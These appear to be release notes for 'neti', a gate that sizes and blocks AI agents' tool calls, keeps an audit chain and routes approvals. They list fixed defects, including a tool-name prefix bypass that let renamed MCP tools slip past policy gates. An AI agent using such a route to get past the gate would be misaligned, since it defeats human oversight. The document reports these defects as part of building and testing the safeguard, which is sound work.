- **replay** answers "does this verdict still follow from this evidence?"

Give `verify` a policy and it re-derives every recorded verdict from the stored magnitudes,
directions and ceilings. Concretely: upgrade `neti`, replay a year of audit log, and find out
whether anything would now be decided differently. Records written under a different policy digest
are reported rather than silently skipped. Without `--config` the command behaves exactly as before.

The distinction is sharp enough to test: **tampering breaks the chain, and a decision-procedure
regression does not.** A change to `decide` leaves every digest valid and every verdict wrong, which
is the failure an auditor is relying on this tool to notice.

### End-to-end coverage, and the four defects it found

A new `tests/e2e/` tier tests the product rather than its parts: one invariant over all seven
integration seams, the operator's first week as one flow, every resolver driven through record and
report and back, the hook fuzzed for crash-safety, and `neti gate --stdio` in front of a real
`@modelcontextprotocol/server-filesystem`. It found:

- **An `mcp__server__` prefix bypass.** Tool-name normalisation lived in the adapters, so a
  federated name matched the policy through the hook and the three SDKs but fell through as unknown
  over MCP and through `Preflight`. `Policy.match_tool` now matches exact-first, then
  prefix-stripped — so per-server entries still win, and a proxy's renamed tool no longer slips a
  gate somebody wrote.
- **A resolver that raised took the process with it.** An 80,000-character argument reached httpx
  as a URL and raised `InvalidURL`, exiting the hook with 1 — which fails *every* subsequent tool
  call in that Claude Code session. The engine now contains any exception from a resolver and routes
  it through the declared `on_unresolved`.
- **CI never ran the three SDK adapters** (below), and **`propose` mispredicted its own impact**
  (above).

### Verified against the live GitHub API

`tests/live/` runs the GitHub resolvers against api.github.com and is skipped without a token
(`NETI_GITHUB_TOKEN=$(gh auth token)`). Counts cross-checked independently: 96 repositories, 1,291
files. The truncation path fires on a real repository rather than only a synthetic one. Fifteen
offline tests passed while three defects were live:

- **`/orgs/{owner}` is a 404 for a person**, so `torvalds` — twelve repositories — resolved
  UNRESOLVED. Falls back to `/users/{owner}`.
- **A wrong `EXACT`.** `total_private_repos` comes back `null` when the token cannot see inside the
  account, so a real org resolved to `EXACT 96` with its private repositories invisible. Now a
  `LOWER_BOUND` unless the count is known complete.
- **`github.files` needs seconds.** torvalds/linux measured 5,684ms against a claimed 800ms budget;
  registered with a ten-second timeout, and the docstring carries the measured numbers instead of
  the claim.

`neti check --demo` now exists, so the Entra tenant check can be run end to end on this machine.
It proves the command works; it proves nothing about any real directory.

### Still not claimed

`neti score` still reports 3 of 7 on incident coverage. `storage.objects` was built expecting to
close the PocketOS/Railway entry and does not: that was a Railway block volume deleted by ID through
Railway's API, where `ListObjectsV2` has nothing to enumerate. Its proximate cause was also an
unscoped credential, which is upstream of any magnitude gate.

**The Entra claims remain unverified against a real tenant.** Risk R2 — that
`$filter=userType eq 'Guest'` is O(1) on the cast `transitiveMembers` collection — and metric M2,
latency, both need a directory nobody here has. `neti check` answers both in one command and is
now itself tested; the tenant is the only thing missing. `neti score` says so.

### What the first release is, in one paragraph

`neti` resolves what an agent's tool call will actually touch, before it runs, and stops it when
that exceeds a ceiling you declared. Two distributions: `neti` (Apache-2.0) is the whole gate;
`neti-cloud` (BUSL-1.1) is the control plane. See [LICENSING.md](LICENSING.md) for where the line
sits and why.

### The gate

- **Three integration seams**, none of which need the agent changed. MCP over stdio — the transport
  every local server in Claude Code, Claude Desktop and Cursor actually uses — and over HTTP; the
  Claude Code `PreToolUse` hook, for the built-in tools no proxy can see; and `Preflight`, for a
  tool loop you wrote yourself. All three produce the same denial, word for word.
- **`neti init`** reads the MCP client configs already on the machine, asks each server what tools
  it exposes, and writes a policy. It declares no ceilings — those come from your traffic a week
  later, via `neti report` and `neti propose`.
- **`neti inventory`** is the day-one finding, with no traffic and no configuration: *this agent
  holds a credential that can, in one call, reach 52,400 people and 214 applications.*
- **`neti console`** — the API and the seven-screen UI, one process, one port.
- **Observe and enforce are both free.** Observe records the same verdict and forwards anyway,
  which is what makes installing it reversible.
- Every decision is sealed into a hash chain that `neti verify` checks offline, forever.

### Approvals (`neti-cloud`)

`CONFIRM` means *a person other than the agent's operator should decide this one*, and on one
machine there is nobody to ask. The control plane is the somewhere that question goes.

A grant authorises **one execution of one call under one policy**: bound to a digest over the tool,
its arguments and the policy; single-use; expiring; and refused if the target has grown past the
number the human actually saw. That last one closes a real TOCTOU window — approve 40 people at
17:00, the group is nested into overnight, and the grant would otherwise execute against 40,000.

If the control plane is unreachable, absent or unpaid, the gate behaves exactly as the free tier.
A control plane can only ever make a decision *more* permissive, and only through a named human.

Notification via the console inbox, a signed webhook, Slack (Socket Mode — no public callback URL),
or email. A notifier can never fail a call.

### Known limitations

Read [SCOPE.md](SCOPE.md); the non-coverage list is numbered and `neti score` prints it. The
headline: `neti` answers *how big*, not *whether this is a good idea*, and a per-call gate cannot
see 4,000 individual sends unless you declare a session budget. `neti score` reports honest incident
coverage of 3 of 7 and names the four it misses.

Session budgets are per-process in this release, so a restart mid-session resets the cumulative
total — the mitigation for NC-01 quietly stops applying. Org-wide policy distribution, fleet audit
and shared budgets are designed but not built.

The control plane is a POC: one shared organisation key, no SSO, no per-user identity beyond the
name a reviewer types. Do not expose it to the public internet.

### Verified against real agents

Before release the gate was put in front of things nobody here wrote: real headless Claude Code
sessions via the `PreToolUse` hook, and `@modelcontextprotocol/server-filesystem` over stdio. Both
passed — no broken sessions, no wrong denials, chain intact — and both found defects no offline test
could have:

- **The record chain forked under concurrency.** Claude Code runs tool calls in parallel; as a hook,
  each call is its own process; two read the same chain head and both appended from it. `neti verify`
  correctly reported a break on a chain nobody had tampered with. Chaining now belongs to the sink,
  under an exclusive file lock — not a thread lock, which would have looked correct and prevented
  nothing. Fixing it also cut tail latency from p95 650ms to 184ms, because the contention was the
  same problem.
- **`neti init` told an operator who had already gated every server that it found none.** It was
  skipping wrapped servers correctly and then reporting as if the config were empty.
- **A server's startup banner made a working scan look broken**, interleaving npm warnings into
  `init`'s output. Relaying a server's stderr while gating it is right; during discovery it is noise.

### Fixed before release

- **The policy digest was not stable across processes.** `BudgetRule.tools` is a frozenset, which
  serialises in hash order, so the same policy file hashed differently under different
  `PYTHONHASHSEED`s. That digest is stamped into every decision record and binds every approval.
- **The record chain broke across restarts.** A new `Engine` appending to an existing file wrote
  `prev_digest: null`, which `verify_chain` correctly called a break — on a chain that was not
  broken.
- **A session budget selected the mildest breached band**, so `confirm above 200, block above 1000`
  returned CONFIRM at 1001.
- **A `send_email` budget declared in `recipients` never fired**, because the gate bound
  `entra.principals` and budgets aggregate by unit. The engine now refuses such a policy at
  construction.
- **`neti propose` anchored on p99**, which with three outliers in 143 calls proposed a ceiling that
  would not have caught the 41,203-person send. Re-anchored on p95.
